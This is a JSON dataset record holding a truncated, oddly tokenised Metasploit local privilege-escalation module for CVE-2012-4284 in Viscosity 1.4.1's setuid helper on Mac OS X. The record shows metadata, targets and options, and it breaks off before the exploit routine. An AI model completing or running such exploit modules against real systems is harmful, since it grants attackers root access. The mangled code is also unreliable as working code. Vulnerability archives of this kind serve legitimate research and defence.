{
    "text": "vul_name : Viscosity setuid-set ViscosityHelper Privilege Escalation ， vul_cve : CVE-2012-4284 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # web site for more information on licensing and terms of use. ， require 'msf/core' ， require 'rex' ， require 'msf/core/post/common' ， require 'msf/core/post/file' ， require 'msf/core/exploit/exe' ， class Metasploit4 < Msf : Exploit : Local ， Rank = ExcellentRanking ， include Msf : Exploit : EXE ， include Msf : Post : File ， include Msf : Post : Common ， super ( update_info ( info , { ， 'Name' => 'Viscosity setuid-set ViscosityHelper Privilege Escalation' ,  ， 'Description' => %q{ ， This module exploits a vulnerability in Viscosity 1.4.1 on Mac OS X. The ， vulnerability exists in the setuid ViscosityHelper , where an insufficient ， validation of path names allows execution of arbitrary python code as root. ， This module has been tested successfully on Viscosity 1.4.1 over Mac OS X ， 10.7.5. ， } ,  ， ' ，  [  ，  [ 'CVE' , '2012-4284' ]  ,  ，  [ 'OSVDB' , '84709' ]  ,  ，  [ 'EDB' , '20485' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Jason A. Donenfeld' ,  # Vulnerability discovery and original Exploit ， 'juan vazquez' # Metasploit module ，  ]  ,  ， 'DisclosureDate' => 'Aug 12 2012' ,  ， 'Platform' => 'osx' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'SessionTypes' => [ 'shell' ]  ,  ， 'Targets' => ，  [  ，  [ 'Viscosity 1.4.1 / Mac OS X x86' , { 'Arch' => ARCH_X86 } ]  ,  ，  [ 'Viscosity 1.4.1 / Mac OS X x64' , { 'Arch' => ARCH_X64 } ]  ，  ]  ,  ， 'DefaultOptions' => { \"PrependSetresuid\" => true , \"WfsDelay\" => 2 } ,  ， 'DefaultTarget' => 0 ， } )  ， register_options (  [  ，  # These are not OptPath becuase it's a * remote * path ， OptString.new ( \"WritableDir\" ,  [ true , \"A directory where we can write files\" , \"/tmp\" ]  )  ,  ， OptString.new ( \"Viscosity\" ,  [ true , \"Path to setuid ViscosityHelper executable\" , \"/Applications/Viscosity.app/Contents/Resources/ViscosityHelper\" ]  )  ，  ]  , self.class )  ， end ， def check ， print_error \"ViscosityHelper not found\"",
    "time": "2013.03.05"
}